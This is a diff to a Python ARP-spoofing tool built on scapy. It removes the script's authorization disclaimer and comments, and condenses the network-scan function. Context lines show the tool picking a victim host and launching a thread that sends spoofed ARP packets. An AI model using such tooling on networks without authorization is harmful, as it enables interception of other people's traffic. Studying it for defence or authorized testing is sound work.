@@ -1,10 +1,3 @@
-#!/user/bin python3
-
-# Disclaimer: This script is for educational purposes only.  
-# Do not use against any network that you don't own or have authorization to test. 
-# To run this script use:
-# sudo python3 arp_spoof.py -ip_range 10.0.0.0/24 (ex. 192.168.1.0/24)
-
 import scapy.all as scapy
 import subprocess
 import sys
@@ -27,38 +20,7 @@ def in_sudo_mode():
 
 
 def arp_scan(ip_range):
-    """We use the arping method in scapy. It is a better implementation than writing your own arp scan. You'll often see that your own arp scan doesn't pick up
-       mobile devices. You can see the way scapy implemented the function here: https://github.com/secdev/scapy/blob/master/scapy/layers/l2.py#L726-L749
-       Arguments: ip_range -> an example would be "10.0.0.0/24"
-    """
-    # We create an empty list where we will store the pairs of ARP responses.
-    arp_responses = list()
-    # We send arp packets through the network, verbose is set to 0 so it won't show any output.
-    # scapy's arping function returns two lists. We're interested in the answered results which is at the 0 index.
-    answered_lst = scapy.arping(ip_range, verbose=0)[0]
-    
-    # We loop through all the responses and add them to a dictionary and append them to the list arp_responses.
-    for res in answered_lst:
-        # Every response will look something lke like -> {"ip" : "10.0.0.4", "mac" : "00:00:00:00:00:00"}
-        arp_responses.append({"ip" : res[1].psrc, "mac" : res[1].hwsrc})
-    
-    # We return the list of arp responses which contains dictionaries for every arp response.
-    return arp_responses
-
-
-def is_gateway(gateway_ip):
-    """We can see the gateway by running the route -n command
-       Argument: The gateway_ip address which the program finds automatically should be supplied as an argument.
-    """
-    # We run the command route -n which returns information about the gateways.
-    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
-    # Loop through every row in the route -n command.
-    for row in result:
-        # We look to see if the gateway_ip is in the row, if it is we return True. If False program continues flow and returns False.
-        if gateway_ip in row:
-            return True
-    
-    return False
+    return [{"ip" : res[1].psrc, "mac" : res[1].hwsrc} for res in scapy.arping(ip_range, verbose=0)[0]]
 
 
 get_interface_names = scapy.get_if_list()
@@ -243,8 +205,6 @@ choice = print_arp_res(client_info)
 
 # Select the node to spoof from the client_info list.
 node_to_spoof = client_info[choice]
-
-# get_interface_names()
 
 # Setup the thread in the background which will send the arp spoof packets.
 t1 = threading.Thread(target=send_spoof_packets, daemon=True)
